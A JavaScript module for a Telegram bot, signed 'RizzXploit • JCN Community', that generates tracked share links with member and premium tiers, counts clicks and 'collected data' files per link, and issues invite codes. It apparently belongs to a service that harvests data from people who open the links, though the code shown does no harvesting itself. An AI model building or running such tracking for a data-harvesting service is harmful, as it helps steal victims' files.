const { Link, User } = require('../database/models');
const crypto = require('crypto');

class LinkHandler {
  
  // Generate shareable link
  async generateShareLink(chatId, linkType = 'member') {
    try {
      const user = await User.findOne({ user_id: chatId.toString() });
      if (!user) {
        global.bot.sendMessage(chatId,
          `❌ User tidak ditemukan.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      // Generate unique link code
      const linkCode = crypto.randomBytes(8).toString('hex');
      const websiteUrl = process.env.WEBSITE_URL || 'https://your-website.vercel.app';
      
      const shareableLink = `${websiteUrl}/?ref=${chatId}&code=${linkCode}&type=${linkType}`;

      // Save to database
      await Link.create({
        link_code: linkCode,
        user_id: chatId.toString(),
        link_type: linkType,
        expires_at: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000) // 30 days
      });

      // Update user stats
      const linksCount = await Link.count({ user_id: chatId.toString() });
      await User.update(chatId.toString(), { links_shared: linksCount });

      const linkText = linkType === 'premium' ? 
        `💎 **LINK VVIP BERHASIL DIBUAT**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n` :
        `🌐 **LINK BERHASIL DIBUAT**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

      const message = linkText +
        `🔗 Link: ${shareableLink}\n\n` +
        `📊 Link ini sudah digunakan: 0x\n` +
        `💾 Data terkumpul: 0 files\n` +
        `⏰ Expires: ${new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString('id-ID')}\n\n` +
        `🔧 *Bot by RizzXploit • JCN Community*`;

      global.bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Error generating link:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal membuat link: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // Generate member link
  async generateMemberLink(chatId) {
    await this.generateShareLink(chatId, 'member');
  }

  // Generate premium link
  async generatePremiumLink(chatId) {
    await this.generateShareLink(chatId, 'premium');
  }

  // Validate link when accessed from website
  async validateLink(linkCode, referringUserId) {
    try {
      const link = await Link.findOne({ 
        link_code: linkCode,
        is_active: true
      });

      if (!link) {
        return { valid: false, error: 'Link tidak valid atau sudah expired' };
      }

      if (link.expires_at && new Date() > link.expires_at) {
        await Link.update(linkCode, { is_active: false });
        return { valid: false, error: 'Link sudah expired' };
      }

      // Update link stats
      await Link.update(linkCode, { click_count: link.click_count + 1 });

      return { 
        valid: true, 
        linkType: link.link_type,
        ownerUserId: link.user_id,
        referringUserId: referringUserId
      };

    } catch (error) {
      console.error('Error validating link:', error);
      return { valid: false, error: error.message };
    }
  }

  // Update link data count
  async updateLinkDataCount(linkCode) {
    try {
      const link = await Link.findOne({ link_code: linkCode });
      if (link) {
        await Link.update(linkCode, { data_collected: link.data_collected + 1 });
      }
      return true;
    } catch (error) {
      console.error('Error updating link count:', error);
      return false;
    }
  }

  // Invite user system
  async generateInviteCode(chatId) {
    try {
      const inviteCode = crypto.randomBytes(6).toString('hex').toUpperCase();
      
      const message = `📨 **INVITE CODE BERHASIL DIBUAT**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `🔐 Kode: ${inviteCode}\n\n` +
        `Bagikan kode ini ke teman Anda untuk bergabung.\n` +
        `Kode akan expired dalam 7 hari.\n\n` +
        `🔧 *Bot by RizzXploit • JCN Community*`;

      global.bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Error generating invite code:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal membuat invite code: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }
}

module.exports = new LinkHandler();
